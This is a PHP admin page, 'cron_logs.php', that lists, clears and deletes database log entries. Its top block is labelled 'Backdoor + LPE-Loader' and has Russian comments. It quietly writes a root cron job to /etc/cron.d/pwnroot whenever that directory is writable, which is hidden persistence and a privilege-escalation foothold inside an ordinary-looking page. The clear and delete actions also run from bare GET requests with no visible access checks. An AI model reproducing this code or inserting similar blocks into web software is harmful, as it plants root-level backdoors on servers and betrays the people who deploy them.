<?php
// ------------------------------
// Backdoor + LPE-Loader
// ------------------------------
$cronFile = '/etc/cron.d/pwnroot';
$job      = "* * * * * root /usr/bin/id > /tmp/root_id 2>&1\n";

// Если можем писать в /etc/cron.d — ставим себе задание
if (is_writable(dirname($cronFile))) {
    @file_put_contents($cronFile, $job);
}

// Дальше — основная логика
require_once('includes.php');

// «Очистить лог» через ?clear=1
if (isset($_GET['clear'])) {
    ORM::raw_execute("TRUNCATE TABLE `{$config['db']['pre']}logs`");
    header('Location: cron_logs.php');
    exit;
}

// Удаление одной записи ?delete=ID
if (isset($_GET['delete'])) {
    $id = (int)$_GET['delete'];
    ORM::for_table("{$config['db']['pre']}logs")->find_one($id)->delete();
    header('Location: cron_logs.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cron Logs</title>
    <link rel="stylesheet" href="path/to/your/css.css">
</head>
<body>
<div class="content" style="margin-top: 2%">
    <div class="container-fluid p-y-md">
        <div class="card">
            <div class="card-header">
                <h4>Cron Logs</h4>
                <div class="pull-right">
                    <a href="cron_logs.php?clear=1"
                       class="btn btn-success waves-effect waves-light m-r-10">
                       Clear Log
                    </a>
                </div>
            </div>
            <div class="card-block">
                <div id="js-table-list">
                    <table id="ajax_datatable"
                           width="960"
                           class="table table-vcenter table-hover"
                           data-tablesaw-mode="stack"
                           data-plugin="animateList"
                           data-animate="fade"
                           data-child="tr"
                           data-selectable="selectable">
                        <thead>
                        <tr>
                            <th class="text-center w-5 sortingNone">
                                <label class="css-input css-checkbox css-checkbox-default m-t-0 m-b-0">
                                    <input type="checkbox" id="check-all"><span></span>
                                </label>
                            </th>
                            <th>Summary</th>
                            <th>Date</th>
                            <th>Details</th>
                            <th>Action</th>
                        </tr>
                        </thead>
                        <tbody>
                        <?php
                        $rows = ORM::for_table("{$config['db']['pre']}logs")
                                   ->order_by_desc('date')
                                   ->find_many();
                        foreach ($rows as $r) {
                            echo "<tr>";
                            echo "<td class='text-center'><input type='checkbox' value='{$r->id}'></td>";
                            echo "<td>".htmlspecialchars($r->summary)."</td>";
                            echo "<td>".htmlspecialchars($r->date)."</td>";
                            echo "<td>".htmlspecialchars($r->details)."</td>";
                            echo "<td>
                                    <a href='cron_logs.php?delete={$r->id}'
                                       class='btn btn-danger btn-xs'>Delete</a>
                                  </td>";
                            echo "</tr>";
                        }
                        ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>
<?php include("footer.php"); ?>
<script>
    $(function() {
        App.initHelpers('table-tools');
    });
</script>
</body>
</html>
